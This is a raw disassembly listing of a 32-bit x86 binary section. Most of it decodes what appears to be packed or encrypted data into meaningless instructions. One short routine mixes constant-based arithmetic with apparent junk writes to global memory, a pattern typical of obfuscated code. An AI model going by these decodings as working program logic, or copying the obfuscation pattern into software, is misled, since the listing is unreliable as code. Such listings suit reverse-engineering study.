  40520a:	add    al,0xa6
  40520c:	mov    ch,0x5d
  40520e:	das    
  40520f:	addr16 mov al,0x56
  405212:	xchg   edi,eax
  405213:	xor    bh,BYTE PTR [ebx]
  405215:	push   ss
  405216:	imul   ecx,DWORD PTR [ebx],0xfa61307c
  40521c:	shr    DWORD PTR [edi],0x48
  40521f:	fbstp  TBYTE PTR [eax+eiz*1-0x359ec4d2]
  405226:	add    DWORD PTR [edx],esp
  405228:	enter  0x3c26,0x71
  40522c:	push   edx
  40522d:	out    0x89,al
  40522f:	nop
  405230:	jbe    0x405239
  405232:	and    BYTE PTR [ebx+eiz*1-0x42],0xcc
  405237:	ret    
  405238:	sub    ch,BYTE PTR [edx-0x73]
  40523b:	pop    edx
  40523c:	inc    edi
  40523d:	xor    esi,ebp
  40523f:	rcl    BYTE PTR [ebx+0x26],cl
  405242:	or     dh,BYTE PTR [esi]
  405244:	sahf   
  405245:	xchg   esi,eax
  405246:	inc    BYTE PTR [ebx+0x63b57553]
  40524c:	pusha  
  40524d:	stc    
  40524e:	jle    0x4051ec
  405250:	adc    DWORD PTR ds:0xfa1e45bd,ebp
  405256:	jns    0x405229
  405258:	mov    ebp,0x64e316eb
  40525d:	sti    
  40525e:	lods   al,BYTE PTR ds:[esi]
  40525f:	cwde   
  405260:	jle    0x40522f
  405262:	or     ebx,esp
  405264:	and    dl,BYTE PTR [eax+0x7d701874]
  40526a:	jmp    0x40528f
  40526c:	pushf  
  40526d:	daa    
  40526e:	sbb    al,0x99
  405270:	pop    ds
  405271:	jecxz  0x4052a8
  405273:	mov    esi,0x7d1e849
  405278:	icebp  
  405279:	pop    ds
  40527a:	mov    esi,0xdcd030cb
  40527f:	fistp  QWORD PTR [edi]
  405281:	call   FWORD PTR [eax-0x30]
  405284:	mov    al,BYTE PTR [ebx+ecx*1+0x5e]
  405288:	cs pop ecx
  40528a:	push   ebx
  40528b:	sbb    cl,dh
  40528d:	jecxz  0x4052c8
  40528f:	sti    
  405290:	(bad)  
  405291:	jno    0x405298
  405293:	imul   esp,DWORD PTR [edx],0x4db0528e
  405299:	cmp    esp,DWORD PTR [ebp+0x79]
  40529c:	js     0x40530a
  40529e:	cdq    
  40529f:	sub    al,0xd1
  4052a1:	mov    dl,0x50
  4052a3:	jp     0x4052b2
  4052a5:	dec    esp
  4052a6:	adc    dl,BYTE PTR ds:0xafaeb9cf
  4052ac:	shl    BYTE PTR [edi],1
  4052ae:	pop    ecx
  4052af:	add    eax,0xf1dc3f91
  4052b4:	arpl   WORD PTR [ebp-0x79763432],bp
  4052ba:	cwde   
  4052bb:	nop
  4052bc:	ins    DWORD PTR es:[edi],dx
  4052bd:	pop    ds
  4052be:	mov    DWORD PTR ds:[edi],ebx
  4052c1:	push   esi
  4052c2:	ds retf 
  4052c4:	inc    edx
  4052c5:	dec    edi
  4052c6:	jp     0x4052f2
  4052c8:	xor    BYTE PTR [ebp-0x351611ef],0xb4
  4052cf:	(bad)  
  4052d0:	add    eax,0x714dd143
  4052d5:	cli    
  4052d6:	lock and DWORD PTR [esi],ecx
  4052d9:	sub    al,0x6d
  4052db:	jnp    0x4052b1
  4052dd:	pop    eax
  4052de:	xor    BYTE PTR [ebp-0x51241d77],cl
  4052e4:	call   0xf3bb:0x1171e904
  4052eb:	pop    edi
  4052ec:	add    BYTE PTR [eax-0x10],bl
  4052ef:	jbe    0x4052b3
  4052f1:	dec    edi
  4052f2:	int    0xfb
  4052f4:	add    bh,BYTE PTR [ecx+ebx*2-0x1f]
  4052f8:	or     eax,0x8945238f
  4052fd:	push   edx
  4052fe:	lahf   
  4052ff:	xchg   DWORD PTR [esi-0x3f0bada5],esi
  405305:	push   esp
  405306:	test   al,0x45
  405308:	sub    al,0xa4
  40530a:	repz or cl,BYTE PTR [eax+0x4e445f37]
  405311:	aad    0x13
  405313:	lds    edi,FWORD PTR [edx+ebx*1-0x74b2e08e]
  40531a:	xchg   esp,eax
  40531b:	ficomp DWORD PTR [ebp+esi*2+0x862162c]
  405322:	or     eax,0x569c0b74
  405327:	mov    edi,0x88f214c2
  40532c:	dec    BYTE PTR [ebx-0x26]
  40532f:	or     al,0x1d
  405331:	jecxz  0x40533a
  405333:	add    eax,0x2ec44c9
  405338:	mov    eax,0x711b551d
  40533d:	in     al,dx
  40533e:	test   al,0xb8
  405340:	fdivr  DWORD PTR [esi+eax*1-0x4fd6c50d]
  405347:	and    dl,ah
  405349:	and    DWORD PTR [edi],eax
  40534b:	ss out 0xe,eax
  40534e:	xlat   BYTE PTR ds:[ebx]
  40534f:	cmp    DWORD PTR [edx+eax*1+0x7e],ebp
  405353:	iret   
  405354:	xor    al,0xc8
  405356:	push   0xffffffd3
  405358:	xchg   esi,eax
  405359:	and    BYTE PTR [ebx],ch
  40535b:	inc    ebp
  40535c:	push   0xffffffc7
  40535e:	sub    ebx,ecx
  405360:	jmp    0xecf2:0xe8883bbf
  405367:	pop    edi
  405368:	pop    ds
  405369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40536a:	pop    esi
  40536b:	lods   eax,DWORD PTR ds:[esi]
  40536c:	test   eax,0xcdff6cfb
  405371:	mov    ss,WORD PTR ds:0x93734528
  405377:	imul   edx,ecx,0x9b269d7b
  40537d:	js     0x40537e
  40537f:	sbb    al,0xd7
  405381:	shl    DWORD PTR [ebp-0x68],0x4a
  405385:	or     esp,DWORD PTR cs:[ebx+0x28f0d8c8]
  40538c:	ret    0xbd2a
  40538f:	cmp    eax,0x8ca188de
  405394:	das    
  405395:	sbb    dh,BYTE PTR [edx]
  405397:	xchg   edx,eax
  405398:	clc    
  405399:	dec    esi
  40539a:	adc    eax,0x48b9e8bc
  40539f:	sbb    DWORD PTR [edi+edx*4-0x72],ebp
  4053a3:	mov    edx,0x491089f8
  4053a8:	mov    BYTE PTR [ebp+0x7320ca6d],0xd1
  4053af:	cmp    dl,cl
  4053b1:	and    edx,esp
  4053b3:	mov    esi,ecx
  4053b5:	pop    ebp
  4053b6:	and    esi,esp
  4053b8:	add    BYTE PTR fs:[ebp+0x67],cl
  4053bc:	rol    DWORD PTR [eax],1
  4053be:	jle    0x4053c6
  4053c0:	push   ds
  4053c1:	in     eax,dx
  4053c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053c3:	in     al,dx
  4053c4:	sahf   
  4053c5:	lock cli 
  4053c7:	add    BYTE PTR [ecx+ebx*1-0x36a66c99],0x84
  4053cf:	popf   
  4053d0:	sub    ebx,ebp
  4053d2:	adc    al,0xe7
  4053d4:	out    dx,eax
  4053d5:	xchg   esp,eax
  4053d6:	into   
  4053d7:	lods   al,BYTE PTR ds:[esi]
  4053d8:	into   
  4053d9:	pop    es
  4053da:	inc    edi
  4053db:	int3   
  4053dc:	mov    ds:0xbd0b5ec2,al
  4053e1:	in     eax,dx
  4053e2:	inc    edx
  4053e3:	pop    ds
  4053e4:	push   esi
  4053e5:	mov    eax,0x9ffe73b
  4053ea:	jb     0x405415
  4053ec:	or     eax,0xde6ce1b7
  4053f1:	je     0x405389
  4053f3:	mov    edi,0x92da35ad
  4053f8:	jmp    0x382f:0xc5f9640f
  4053ff:	sub    DWORD PTR [ebx-0x46],0x37c2cfb8
  405406:	xor    BYTE PTR [edx-0x74],ch
  405409:	scas   eax,DWORD PTR es:[edi]
  40540a:	sub    DWORD PTR [edi+0x24431a38],ebp
  405410:	pop    esi
  405411:	scas   al,BYTE PTR es:[edi]
  405412:	xor    esp,0xffffff9e
  405415:	repnz pop esp
  405417:	js     0x405489
  405419:	bound  ecx,QWORD PTR [eax-0x7d]
  40541c:	mov    BYTE PTR [eax],ah
  40541e:	xor    ah,BYTE PTR [edi+ebp*1+0xf]
  405422:	mov    eax,0x7fae574e
  405427:	repz sbb al,0xc6
  40542a:	xor    al,0xd2
  40542c:	mov    al,0x4f
  40542e:	ins    DWORD PTR es:[edi],dx
  40542f:	mov    ?,WORD PTR [edx+0x2b]
  405432:	mov    DWORD PTR [eax+ecx*2],edi
  405435:	les    eax,FWORD PTR [eax]
  405437:	mov    esi,0xd319a1b5
  40543c:	jge    0x40548e
  40543e:	repz jae 0x405446
  405441:	inc    esi
  405442:	iret   
  405443:	call   FWORD PTR [edi+0x2d]
  405446:	jg     0x40547f
  405448:	retf   
  405449:	sbb    ah,dl
  40544b:	sub    DWORD PTR [ecx+0x21f7f48e],esi
  405451:	mov    al,ds:0xbb8525e3
  405457:	mov    DWORD PTR [edi+0x44],esp
  40545a:	jmp    0x9500:0xaa76ad57
  405461:	out    dx,eax
  405462:	mov    esp,0x860ffa3b
  405467:	push   ebp
  405468:	idiv   bh
  40546a:	dec    DWORD PTR [ebx+0x7d8bf455]
  405470:	fsub   st(1),st
  405472:	inc    BYTE PTR [edx]
  405474:	add    BYTE PTR [eax],al
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x22e0fbb8]
  405484:	call   0x587e:0x7e2bd03d
  40548b:	jl     0x40550b
  40548d:	jle    0x405437
  40548f:	xchg   BYTE PTR [edx+ebp*1+0x1638c7e5],ah
  405496:	xor    BYTE PTR [edx+edx*2],0x16
  40549a:	add    eax,esp
  40549c:	mov    ds:0xf43dd805,eax
  4054a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054a2:	sbb    eax,DWORD PTR [edi]
  4054a4:	call   0x9097:0xb8a5c8d0
  4054ab:	cmp    eax,0x34e8feaf
  4054b0:	enter  0x3565,0x3a
  4054b4:	outs   dx,BYTE PTR ds:[esi]
  4054b5:	mov    ecx,DWORD PTR [esi-0x1013b006]
  4054bb:	gs push edi
  4054bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054be:	inc    edi
  4054bf:	leave  
  4054c0:	je     0x40552b
  4054c2:	inc    edi
  4054c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054c4:	aam    0xa4
  4054c6:	stos   DWORD PTR es:[edi],eax
  4054c7:	dec    eax
  4054c8:	jmp    0xf717:0x395ee763
  4054cf:	sti    
  4054d0:	sbb    eax,0xed8b5204
  4054d5:	push   ebx
  4054d6:	push   esp
  4054d7:	iret   
  4054d8:	jmp    0x4054f8
  4054da:	xchg   esi,eax
  4054db:	pushf  
  4054dc:	pop    esp
  4054dd:	fisttp WORD PTR [edi]
  4054df:	lods   eax,DWORD PTR ds:[esi]
  4054e0:	lock cmp al,0x72
  4054e3:	or     eax,0xa2351b89
  4054e8:	(bad)  
  4054e9:	je     0x4054e3
  4054eb:	jns    0x405549
  4054ed:	jnp    0x405555
  4054ef:	fnstsw WORD PTR [edx-0x79]
  4054f2:	xor    al,0xd5
  4054f4:	xor    edx,ebx
  4054f6:	into   
  4054f7:	popa   
  4054f8:	(bad)  
  4054f9:	out    0x17,eax
  4054fb:	jne    0x405488
  4054fd:	push   ebx
  4054fe:	icebp  
  4054ff:	mov    WORD PTR [ebp+ecx*2-0x19ef1fc5],ds
  405506:	jge    0x4054d1
  405508:	xchg   DWORD PTR [edx-0x2f],ebx
  40550b:	xor    ah,cl
  40550d:	jmp    0x4054aa
  40550f:	icebp  
  405510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405511:	pop    esp
  405512:	in     eax,dx
  405513:	cmp    al,0xa6
  405515:	mov    ch,BYTE PTR [ecx-0x45]
  405518:	mov    ch,0x70
  40551a:	rcr    DWORD PTR [ecx-0xc],0x8f
  40551e:	mov    edx,0xe2e9bc2e
  405523:	or     BYTE PTR ds:0x7eb7ffd3,ch
  405529:	gs mov al,0xcb
  40552c:	push   eax
  40552d:	and    dl,BYTE PTR [edi+0x1dbc4135]
  405533:	add    al,0x42
  405535:	mov    esi,0x7eba272d
  40553a:	xchg   ecx,eax
  40553b:	mov    esi,0x5ecf9e86
  405540:	in     eax,dx
  405541:	test   eax,0x2acab3b7
  405546:	jg     0x4054cb
  405548:	inc    ebx
  405549:	add    bl,bl
  40554b:	lock cmp DWORD PTR [ebp-0xb],ebp
  40554f:	out    dx,al
  405550:	(bad)
  405553:	and    eax,0xeacab292
  405558:	sub    al,0x28
  40555b:	je     0x4055d6
  40555d:	xchg   ebx,eax
  40555e:	mov    dl,0x8b
  405560:	add    BYTE PTR [edi],dh
  405562:	cli    
  405563:	(bad)  [edx+0x55704644]
  405569:	fild   QWORD PTR [esi+0x3d]
  40556c:	cmp    esi,DWORD PTR [esi+esi*1-0x6ebe2a3d]
  405573:	mov    ds:0xc5efa6b6,al
  405578:	outs   dx,DWORD PTR ds:[esi]
  405579:	sub    al,0x1b
  40557b:	lahf   
  40557c:	fwait
  40557d:	jl     0x40558c
  40557f:	sbb    esi,DWORD PTR [esi+0x4a]
  405582:	inc    eax
  405583:	aaa    
  405584:	and    eax,0xffe59cc7
  405589:	outs   dx,DWORD PTR ds:[esi]
  40558a:	mov    BYTE PTR [ebp+0x5e7e5446],al
  405590:	scas   al,BYTE PTR es:[edi]
  405591:	sub    al,0x76
  405593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405594:	enter  0x7671,0xb8
  405598:	daa    
  405599:	xor    eax,0x268e275d
  40559e:	jns    0x4055b0
  4055a0:	cmp    eax,0x12edacb9
  4055a5:	popf   
  4055a6:	mov    BYTE PTR [ebp+0xb],cl
  4055a9:	xor    ebp,eax
  4055ab:	call   0xccfe62bb
  4055b0:	and    DWORD PTR [eax+0x1ca0766d],ecx
  4055b6:	int    0x98
  4055b8:	icebp  
  4055b9:	cs push 0xb07a05d5
  4055bf:	or     al,ah
  4055c1:	jno    0x4055d2
  4055c3:	mov    esi,0x87edb63d
  4055c8:	mov    al,0x59
  4055ca:	lahf   
  4055cb:	adc    DWORD PTR [ebx+0x76f4251a],esp
  4055d1:	clc    
  4055d2:	push   eax
  4055d3:	sbb    eax,edi
  4055d5:	in     al,0x10
  4055d7:	out    0x79,eax
  4055d9:	bound  edx,QWORD PTR [ebx+0x62]
  4055dc:	mov    DWORD PTR [ecx+edx*4-0x2],ebx
  4055e0:	scas   eax,DWORD PTR es:[edi]
  4055e1:	stos   DWORD PTR es:[edi],eax
  4055e2:	dec    ebp
  4055e3:	in     eax,dx
  4055e4:	dec    ebx
  4055e5:	(bad)  
  4055e7:	cli    
  4055e8:	addr16 sahf 
  4055ea:	test   BYTE PTR [ecx+0xae9aa02],ch
  4055f0:	mov    ecx,0xf9cc629a
  4055f5:	jb     0x4055a9
  4055f7:	(bad)  
  4055f8:	out    0xbc,eax
  4055fa:	xor    esi,eax
  4055fc:	jbe    0x405592
  4055fe:	std    
  4055ff:	(bad)  
  405600:	jnp    0x40562c
  405602:	push   ebx
  405603:	mov    WORD PTR [edi-0x106a176c],?
  405609:	mov    bl,BYTE PTR [eax]
  40560b:	stc    
  40560c:	in     eax,0xeb
  40560e:	xlat   BYTE PTR ds:[ebx]
  40560f:	call   0x270c:0xac4d1d4
  405616:	iret   
  405617:	xor    BYTE PTR [edi-0x44bb4e78],bh
  40561d:	leave  
  40561e:	lds    ebp,FWORD PTR [ebx+edx*2]
  405621:	out    0xbe,al
  405623:	mov    esp,0x200a46c
  405628:	out    0x2e,eax
  40562a:	pop    esi
  40562b:	xor    DWORD PTR [eax+ecx*1-0x5c10639],edx
  405632:	adc    BYTE PTR [ebx],0x4e
  405635:	add    DWORD PTR [edx+0x24],0x4c
  405639:	into   
  40563a:	mov    DWORD PTR [ecx-0x47],edx
  40563d:	bound  edx,QWORD PTR [esi+0x17]
  405640:	dec    edi
  405641:	mov    ebp,0xeee96a1a
  405646:	add    eax,0x12b999e4
  40564b:	xchg   edx,eax
  40564c:	adc    al,BYTE PTR [edx]
  40564e:	popf   
  40564f:	xlat   BYTE PTR ds:[ebx]
  405650:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  405652:	cmc    
  405653:	aas    
  405654:	sbb    ch,BYTE PTR [ecx+0x60aec831]
  40565a:	out    0x98,eax
  40565c:	push   ecx
  40565d:	mov    ecx,0xc0509ee5
  405662:	aam    0x78
  405664:	das    
  405665:	mov    ecx,0x154e4bb8
  40566a:	outs   dx,DWORD PTR ds:[esi]
  40566b:	push   ebp
  40566c:	idiv   BYTE PTR [eax-0x63368f49]
  405672:	sbb    eax,0x91bdc97e
  405677:	(bad)  
  405678:	pop    ds
  405679:	cld    
  40567a:	push   ss
  40567b:	cli    
  40567c:	xchg   ebp,esi
  40567e:	ds sbb ah,0xa0
  405682:	js     0x4056dc
  405684:	scas   al,BYTE PTR es:[edi]
  405685:	inc    ebp
  405686:	js     0x405669
  405688:	lods   eax,DWORD PTR ds:[esi]
  405689:	rcl    BYTE PTR [edi-0x6],1
  40568c:	std    
  40568d:	aaa    
  40568e:	(bad)
  405692:	leave  
  405693:	or     al,0x91
  405695:	es pop ebp
  405697:	jg     0x4056b0
  405699:	daa    
  40569a:	mov    eax,DWORD PTR [edi+edx*1-0x7eb8cc2d]
  4056a1:	dec    ecx
  4056a2:	das    
  4056a3:	xor    al,0xe8
  4056a5:	inc    ebp
  4056a6:	cmp    DWORD PTR [edi],0xba5b4641
  4056ac:	jmp    DWORD PTR [esi]
  4056ae:	dec    edi
  4056af:	int    0xdb
  4056b1:	jo     0x405654
  4056b3:	push   eax
  4056b4:	inc    ebx
  4056b5:	jl     0x405655
  4056b7:	and    dh,ah
  4056b9:	cmp    ch,cl
  4056bb:	in     eax,dx
  4056bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056bd:	adc    al,0x52
  4056bf:	call   0xf501:0x2a36d609
  4056c6:	out    0xa5,al
  4056c8:	push   0x65
  4056ca:	mov    bh,0x6d
  4056cc:	mov    ebp,0x2a3dc58e
  4056d1:	pop    ebp
  4056d2:	out    dx,al
  4056d3:	mov    DWORD PTR [ebx+0x702ab1c0],edi
  4056d9:	sahf   
  4056da:	enter  0xec50,0xb9
  4056de:	fwait
  4056df:	or     cl,BYTE PTR [edx]
  4056e1:	xchg   ebx,eax
  4056e3:	xor    ch,BYTE PTR [edi-0x68]
  4056e6:	retf   0x7ca1
  4056e9:	jge    0x405699
  4056eb:	sub    DWORD PTR [edx-0x1b],edi
  4056ee:	cmp    DWORD PTR [ebp+0x27],ebp
  4056f1:	dec    edx
  4056f2:	cli    
  4056f3:	fnstsw WORD PTR [esi]
  4056f5:	xor    edi,esi
  4056f7:	mov    edi,0xffef196b
  4056fc:	fst    DWORD PTR [eax-0x77]
  4056ff:	adc    BYTE PTR [edx],al
  405701:	jmp    0xe4fe:0xc4e0d910
  405708:	add    DWORD PTR [esi-0x6e],esp
  40570b:	mov    BYTE PTR [ebp-0x2f81abba],ah
  405711:	std    
  405712:	and    eax,0x78edbdcc
  405717:	push   0x93f87070
  40571c:	mov    cs:0xe28db76a,eax
  405722:	mov    dl,BYTE PTR [edx+esi*8]
  405725:	shr    ecx,cl
  405727:	out    0x78,eax
  405729:	nop
  40572a:	ret    
  40572b:	fcom   QWORD PTR [ecx+0x11]
  40572e:	das    
  40572f:	sub    DWORD PTR [eax+0x2ed48563],esi
  405735:	xor    eax,eax
  405737:	(bad)  
  405739:	push   esi
  40573a:	cmp    eax,0xb65930be
  40573f:	add    al,0xd3
  405741:	ret    
  405742:	pop    edi
  405743:	ficom  WORD PTR [edi]
  405745:	jae    0x40576e
  405747:	rcr    DWORD PTR [eax+edx*1],cl
  40574a:	push   eax
  40574b:	out    0x5,al
  40574d:	retf   0xd9a8
  405750:	in     al,dx
  405751:	std    
  405752:	push   edi
  405753:	pop    ss
  405754:	dec    esi
  405755:	add    dl,BYTE PTR [edx+0x1a]
  405758:	out    dx,eax
  405759:	add    DWORD PTR [edx-0x62],edx
  40575c:	mov    bl,0xe
  40575e:	retf   0x799b
  405761:	mov    dh,BYTE PTR [edi-0x29]
  405764:	push   eax
  405765:	sbb    edx,esi
  405767:	xchg   esi,eax
  405768:	push   edx
  405769:	or     ch,BYTE PTR [ebx-0x7c1e7fec]
  40576f:	jne    0x4057a0
  405771:	ret    0xc209
  405774:	xor    edx,eax
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43371b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433623,0x433603
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43365f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0xe3
  4057f5:	xchg   esp,eax
  4057f6:	and    DWORD PTR [esi],esi
  4057f8:	cmp    dh,BYTE PTR [esi]
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	dec    ebx
  405801:	(bad)  
  405802:	mov    dl,0xd2
  405804:	or     DWORD PTR [edx+0x46],0x64cddd84
  40580b:	jecxz  0x405847
  40580d:	out    0x5f,al
  40580f:	and    cl,BYTE PTR [esi-0x7e]
  405812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405813:	test   DWORD PTR [ebx+0x525c2d4],ebp
  405819:	ins    BYTE PTR es:[edi],dx
  40581a:	mov    ecx,DWORD PTR [ebx+0x6355879d]
  405820:	gs mov al,0x5f
  405823:	sub    esp,esp
  405825:	test   al,0x44
  405828:	test   DWORD PTR [eax-0x1c],0x479c4ec8
  40582f:	loope  0x4057f2
  405831:	mov    edi,0x727b77fa
  405836:	inc    edi
  405837:	mov    ah,0x92
  405839:	dec    edx
  40583a:	dec    eax
  40583b:	std    
  40583c:	in     eax,dx
  40583d:	fs inc eax
  40583f:	outs   dx,DWORD PTR ds:[esi]
  405841:	push   0x2b
  405843:	or     BYTE PTR [esi],0xae
  405846:	sub    eax,0xed6ecbe
  40584b:	xchg   ecx,eax
  40584c:	(bad)  
  40584d:	stc    
  40584e:	and    esp,0xc8713975
  405854:	shl    BYTE PTR [edx+ecx*8],0x19
  405858:	fistp  QWORD PTR [edx]
  40585a:	add    DWORD PTR [ebx+edx*8],ecx
  40585d:	sub    al,0x58
  40585f:	xchg   edi,eax
  405860:	sub    dh,BYTE PTR [eax]
  405862:	sahf   
  405863:	sbb    edx,DWORD PTR [eax+0x2fd7d2df]
  405869:	fsub   DWORD PTR [eax]
  40586b:	in     al,dx
  40586c:	(bad)  
  40586d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40586e:	dec    ecx
  40586f:	mov    ebx,0xfd9549eb
  405874:	mov    eax,esi
  405876:	mov    dl,BYTE PTR [edi-0x25]
  405879:	(bad)  
  40587a:	enter  0x7bc9,0x83
  40587e:	stc    
  40587f:	xor    edi,DWORD PTR [edi+eax*8-0x4a9c1dd0]
  405886:	(bad)  
  405887:	sti    
  405888:	sub    edi,DWORD PTR [esi]
  40588a:	(bad)  
  40588b:	cmp    eax,0x4e4abb58
  405890:	retf   
  405891:	pop    eax
  405892:	push   ss
  405893:	mov    esi,0x2322bb60
  405898:	and    DWORD PTR [ebx],eax
  40589a:	les    esi,FWORD PTR [ecx-0x7a8ccd99]
  4058a0:	mov    ds,WORD PTR [eax+0x13c2a2fc]
  4058a6:	jecxz  0x405860
  4058a8:	inc    esp
  4058a9:	sub    ebp,DWORD PTR [ebx+eax*2]
  4058ac:	inc    ecx
  4058ad:	sti    
  4058ae:	adc    dl,BYTE PTR [ecx]
  4058b0:	ficom  WORD PTR [ecx]
  4058b2:	imul   esi,DWORD PTR [ebx-0x73],0x6060fd8c
  4058b9:	dec    esp
  4058ba:	cwde   
  4058bb:	inc    esi
  4058bc:	xor    edx,esp
  4058be:	sahf   
  4058bf:	leave  
  4058c0:	fmul   QWORD PTR [ebx-0x303ebf43]
  4058c6:	int    0xe4
  4058c8:	mov    esp,0xfb42ef21
  4058cd:	xchg   esi,eax
  4058ce:	xor    eax,0x55ac5cfb
  4058d3:	hlt    
  4058d4:	jb     0x4058c8
  4058d6:	push   edi
  4058d7:	mov    ebx,0x55a39e8e
  4058dc:	jns    0x4058ee
  4058de:	xor    dl,BYTE PTR [ebx+0x239184e9]
  4058e4:	push   ebp
  4058e5:	push   edi
  4058e6:	push   eax
  4058e7:	cmp    al,0x2a
  4058e9:	lock inc esp
  4058eb:	retf   
  4058ec:	dec    eax
  4058ed:	lahf   
  4058ee:	cmc    
  4058ef:	add    eax,0x955afac1
  4058f4:	add    BYTE PTR [edx+0x2b0cb8a4],bh
  4058fa:	xor    BYTE PTR [edx],bl
  4058fc:	test   BYTE PTR [ebx+0x63],0xb9
  405900:	aas    
  405901:	mov    dl,0xd0
  405903:	mov    BYTE PTR [edi+0x2e],dl
  405906:	lock test DWORD PTR [eax],esp
  405909:	or     DWORD PTR [esi-0x6edbc60c],ebx
  40590f:	xchg   esp,eax
  405910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405911:	jle    0x405935
  405913:	adc    eax,0x8a3d53e
  405918:	icebp  
  405919:	sahf   
  40591a:	and    eax,DWORD PTR [ecx-0x35dfa87d]
  405920:	fcomp  DWORD PTR [ecx-0x72]
  405923:	pmaddwd mm4,QWORD PTR [edi+0x381a7ef4]
  40592a:	push   esi
  40592b:	call   0x75e3719d
  405930:	clc    
  405931:	dec    ebx
  405932:	lea    edi,[esi]
  405934:	xor    DWORD PTR [edx+eiz*8],edx
  405937:	jne    0x40590c
  405939:	adc    BYTE PTR [ebx+0x4a2e6452],al
  40593f:	cmp    cl,BYTE PTR [edx+0x55]
  405942:	stos   BYTE PTR es:[edi],al
  405943:	pop    ebp
  405944:	mov    esp,DWORD PTR [ebx+0x44]
  405947:	adc    eax,0xdbdce814
  40594c:	pop    ebp
  40594d:	ins    DWORD PTR es:[edi],dx
  40594e:	cwde   
  40594f:	ja     0x4059b4
  405951:	xchg   BYTE PTR [edi-0x6f],cl
  405954:	inc    edx
  405955:	imul   edi,DWORD PTR [eax+0x70],0xffffffe5
  405959:	jbe    0x405977
  40595b:	sub    edx,esi
  40595d:	cwde   
  40595e:	xlat   BYTE PTR ds:[ebx]
  40595f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405960:	clc    
  405961:	scas   eax,DWORD PTR es:[edi]
  405962:	push   ecx
  405963:	fadd   QWORD PTR [ebx+eax*8+0x5e69faa3]
  40596a:	adc    eax,0x82dab720
  40596f:	mov    ah,0xa
  405971:	xchg   esi,eax
  405972:	retf   0xc788
  405975:	push   0x7da36dc3
  40597a:	fwait
  40597b:	pop    es
  40597c:	sbb    al,0x39
  40597e:	mov    cl,0xdb
  405980:	aaa    
  405981:	fcmovnb st,st(6)
  405983:	jns    0x405915
  405985:	call   0x8384d68e
  40598a:	xor    eax,esi
  40598c:	sbb    eax,0xa57e6aa8
  405991:	iret   
  405992:	push   0xffffffe1
  405994:	mov    dl,0x56
  405996:	jne    0x405a10
  405998:	retf   0xbcb1
  40599b:	add    DWORD PTR [esi],0x52a90026
  4059a1:	mov    dl,0x11
  4059a3:	stos   BYTE PTR es:[edi],al
  4059a4:	call   0xf193c5cc
  4059a9:	cli    
  4059aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059ab:	pop    ebx
  4059ac:	dec    eax
  4059ad:	pop    ebp
  4059ae:	xor    BYTE PTR [edi],0x37
  4059b1:	outs   dx,BYTE PTR ds:[esi]
  4059b2:	or     eax,0x53a78394
  4059b7:	test   al,0x16
  4059b9:	pop    ebp
  4059ba:	mov    edi,0xb9648f9f
  4059bf:	cmp    BYTE PTR [ecx-0x595f0dce],al
  4059c5:	jmp    0xd11a:0xabd00418
  4059cc:	mov    ecx,gs
  4059ce:	inc    ebp
  4059cf:	cmp    al,0x5e
  4059d1:	test   al,0x92
  4059d3:	sar    bl,cl
  4059d5:	ds aas 
  4059d7:	pop    ebx
  4059d8:	pop    esp
  4059d9:	arpl   WORD PTR [ecx+0x5836461],ax
  4059df:	hlt    
  4059e0:	sub    DWORD PTR [esi-0x6c45a456],ebp
  4059e6:	scas   eax,DWORD PTR es:[edi]
  4059e7:	and    esp,ecx
  4059e9:	sbb    cl,BYTE PTR [ecx]
  4059eb:	mov    ebx,0x246f5b72
  4059f0:	fisubr DWORD PTR ds:0x6f18d052
  4059f6:	dec    ebx
  4059f7:	std    
  4059f8:	fnstenv [edx+0x9]
  4059fb:	es neg dh
  4059fe:	cmp    DWORD PTR [ecx],edx
  405a00:	mov    bh,0x12
  405a02:	call   0x211a5b4
  405a07:	in     eax,dx
  405a08:	jae    0x405a32
